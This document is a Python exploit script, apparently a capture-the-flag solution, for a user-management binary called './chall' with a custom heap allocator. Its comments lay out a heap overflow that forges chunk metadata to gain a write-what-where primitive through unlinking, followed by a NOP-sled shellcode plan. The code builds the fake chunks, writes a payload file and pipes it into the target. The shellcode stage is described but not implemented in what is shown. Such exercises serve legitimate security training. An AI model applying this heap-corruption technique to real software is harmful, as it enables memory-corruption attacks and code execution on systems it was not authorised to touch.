"""
Exploit : The whole process is the following :

1) Use a heap overflow to overwrite heap chunks metadata in a way that once we free some chunk we get a write-what-where primitive with the binlist_unlink() macro
2) Free this chunk : Now we have arbitrary write-what-where but where to write ?
    -> Heap shellcode : Use a method called heap filling where we basically fill the whole heap with a lot of 0x90 (NOP instruction) bytes and at the very-end, we place our shellcode that would be executed since heap is executable
3) Do it and redirect code execution to it 


"""

"""
List of all actions : 
1) Register as new user
2) Login user
3) Modify user
4) Whoami
5) Show all users
6) Delete user
7) Disconnect
8) exit

Exploit written for 64 bits (x86_64) target
"""

import os
import struct

"""
Based on hchunk struct in heap.h :
typedef struct HeapChunk
{
	ulong size;
	ulong prev_size;
	byte prev_used;
	byte used;
	struct HeapChunk* alloc_base;
	struct HeapChunk* fd; // forward pointer in fastbin linked list (free)
	struct HeapChunk* bk; // backward pointer in fastbin linked list (free)
} hchunk;
"""

ALLOC_MEM_SIZE = 64
HEAP_CHUNK_SIZE = 48

ALLOC_CHUNK_SIZE = ALLOC_MEM_SIZE + HEAP_CHUNK_SIZE

FD_OFF = 32
BK_OFF = 40

CURRENT_USER_ADDRESS = 0x4060a8

def bit_to_byte(bit):
    if(bit):
        return b"\x01"
    else:
        return b"\x00"

class HeapChunk():
    
    def __init__(self, size, prev_size, prev_used, used, alloc_base, fd, bk):
        self.size = size
        self.prev_size = prev_size
        self.prev_used = prev_used
        self.used = used
        self.alloc_base = alloc_base
        self.fd = fd
        self.bk = bk

    def build(self):
        payload = b""

        payload += struct.pack("Q", self.size)
        payload += struct.pack("Q", self.prev_size)
        payload += bit_to_byte(self.prev_used)
        payload += bit_to_byte(self.used)
        payload += b"p"*6 # padding to 8 
        payload += struct.pack("Q", self.alloc_base)
        payload += struct.pack("Q", self.fd)
        payload += struct.pack("Q", self.bk)

        return payload

instructions = []

# username and password are both 64 bytes for memory 
def new_user(username, password):
    instructions.append(b"1")
    instructions.append(username)
    instructions.append(password)

def login_user(username, password):
    instructions.append(b"2")
    instructions.append(username)
    instructions.append(password)

def delete_current_user():
    instructions.append(b"6")

def modify_current_user(new_username, new_password, modify_password=True):
    instructions.append(b"3")
    instructions.append(new_username)

    if modify_password:
        instructions.append(b"1")
    else:
        instructions.append(b"0")
    instructions.append(new_password)

def exit_program():
    instructions.append(b"8")

def writestdline(l, f):
    file.write(l + b"\n")


def build_exploit_fake_chunk1():
    payload = b""

    payload += struct.pack("Q", ALLOC_CHUNK_SIZE) # size (ALLOC_MEM_SIZE)
    payload += struct.pack("Q", 0) # prev_size (0)
    # prev_used would be set to 0 if before new line
    return payload

"""
write-what-where primitive.

will write src to dst (src has to be 8 bytes number).

src has to be a valid adress that is writeable and same goes for dst (of course). 

"""
def build_exploit_fake_chunk2(dst, src):
    size = ALLOC_CHUNK_SIZE
    prev_size = 0 # this will we overwritten when this chunk will be freed
    prev_used = 0 # this will we overwritten when this chunk will be freed
    used = 0 # simulate a freed chunk
    alloc_base = 0 # NULL
    fd = dst - BK_OFF # because this way the chunk's bk will be set to dst
    bk = src # it will write dst to src + FD_OFF

    return HeapChunk(size, prev_size, prev_used, used, alloc_base, fd, bk).build()



file = open("payload", "wb")

# create a user

# c1 = halloc(64)
# c2 = halloc(64)

new_user(b"user0", b"l33t")

# create another user

# c3 = halloc(64)
# c4 = halloc(64)

new_user(b"user1", b"1337")

# First user
login_user(b"user0", b"l33t") 

# username : c1, password : c2

# second chunk (c2) chunk metadata

c1_payload = b""
c1_payload += b"B"*ALLOC_MEM_SIZE # overflow the buffer
c1_payload += build_exploit_fake_chunk1()

# second chunk (c3) chunk metadata

c2_payload = b""
c2_payload += b"A"*ALLOC_MEM_SIZE # overflow the buffer 
c2_payload += build_exploit_fake_chunk2(CURRENT_USER_ADDRESS, CURRENT_USER_ADDRESS)

modify_current_user(c1_payload, c2_payload, True)

exit_program()

delete_current_user()




for e in instructions:
    print(e)
    writestdline(e, file)

file.close()

os.system("cat payload | ./chall")
